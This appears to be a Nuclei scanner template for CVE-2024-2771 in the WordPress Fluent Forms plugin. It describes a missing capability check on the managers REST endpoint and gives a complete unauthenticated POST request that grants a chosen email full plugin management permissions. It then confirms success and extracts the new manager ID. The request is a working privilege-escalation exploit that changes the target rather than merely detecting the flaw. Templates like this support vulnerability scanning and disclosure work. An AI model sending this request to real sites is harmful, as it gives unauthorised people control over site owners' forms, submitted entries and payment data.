id: CVE-2024-2771

info:
  name: WordPress Fluent Forms - Unauthenticated Manager Updation
  author: Sourabh-Sahu
  severity: critical
  description: |
    The plugin is vulnerable to privilege escalation due to a missing capability check on the /wp-json/fluentform/v1/managers REST API endpoint. This makes it possible for unauthenticated attackers to grant users with Fluent Form management permissions which gives them access to all of the plugin's settings and features. This also makes it possible for unauthenticated attackers to delete manager accounts.
  reference:
    - https://github.com/whale93/CVE-2024-2771-PoC
    - https://nvd.nist.gov/vuln/detail/CVE-2024-2771
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-2771
    cwe-id: CWE-862
    cpe: cpe:2.3:a:fluentforms:contact_form:*:*:*:*:*:wordpress:*:*
  metadata:
    max-request: 1
    verified: true
  tags: wordpress,fluentforms,rce,cve,cve2024,unauthenticated

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-json/fluentform/v1/managers"

    headers:
      Content-Type: application/json

    body: |
      {
        "manager": {
          "email": "{{email}}",
          "permissions": [
            "fluentform_dashboard_access",
            "fluentform_forms_manager",
            "fluentform_entries_viewer",
            "fluentform_manage_entries",
            "fluentform_view_payments",
            "fluentform_manage_payments",
            "fluentform_settings_manager",
            "fluentform_full_access"
          ]
        }
      }

    matchers:
      - type: word
        part: body
        words:
          - '"Manager has been saved."'
          - '"email":"{{email}}"'

    extractors:
      - type: json
        json:
          - .manager.id
